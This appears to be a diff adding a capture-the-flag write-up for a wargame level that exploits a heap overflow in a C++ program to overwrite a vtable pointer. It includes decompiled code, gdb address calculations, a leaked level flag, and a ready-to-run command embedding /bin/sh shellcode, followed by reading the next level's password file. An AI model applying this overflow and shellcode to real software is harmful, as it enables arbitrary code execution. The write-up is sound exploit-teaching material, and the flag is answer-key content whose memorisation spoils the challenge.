@@ -1,1 +1,65 @@
-fucking c++
+flag: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+This level is a vtable hijacking.
+We got a main that looks like this:
+
+int main(int ac, char **av) {
+	if (ac < 2) {
+		exit(1);
+	}
+
+	N *el = new N(108);
+	N *el2 = new N(108);
+
+	el->setAnnotation(argv[1]);
+
+	(*(void (**)(N*, N*))*el2)(el2, el);
+}
+
+Looking at the decompilation of setAnnotation shows that it memcpy a string into
+one of its attributes:
+
+void N::setAnnotation(char *str) {
+	size_t n;
+
+	n = strlen(arg);
+	memcpy(this + 4, str, n);
+	return;
+}
+
+It doesn't set any limit for the size we can copy, so we can overflow it.
+Looking back at the main we see this line:
+
+(*(void (**)(N*, N*))*el2)(el2, el1);
+
+It's gross, but it basically means that it executes the first address of the vtable
+of el2. A vtable is an array that contains a pointer to every virtual function
+of an object. Each object for which its class has at least one virtual function got
+a vptr pointing to its vtable at the very start of the object.
+
+so (void (**)(N*, N*)*vptr)(obj1, obj2) means we execute the first function
+of the vtable following the vptr.
+and (*void (**)(N*, N*)*obj1)(obj1, obj2) means we execute the first function of the vtable of the object obj.
+
+Now to the details:
+The vptr is placed at the start of the object. By overflowing our buffer, we will reach the start of the second object. What we can then do is modify the value of the vptr of the second object to make it point to a vtable we would have created ourselves.
+I use the same shellcode as for level2, and change the vptr to an address which contains the address of the start of the shellcode, to create the following schema:
+
+vptr [the value we rewrite] => vtable => shellcode
+
+To calculate the address, we use gdb: We place a breakpoint after the call to memcpy
+and check eax with 'i r eax' to get the return address of memcpy: This is the start
+of the shellcode => 0x804a00c [vtable]
+We know that our shellcode is 45 bytes long, so we add 45 to our previous address to
+get the address of our vtable => 0x804a039 [vptr]
+
+Schematically, our payload looks like:
+
+[shellcode][vtable][padding][vptr]
+
+We got 45 bytes of shellcode and 4 bytes of address, so we add 59 bytes of padding to
+reach a size of 108, then we add the vptr.
+
+./level9 $(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x0c\xa0\x04\x08"+"A"*59+"\x39\xa0\x04\x08"')
+
+> cat /home/user/bonus0/.pass
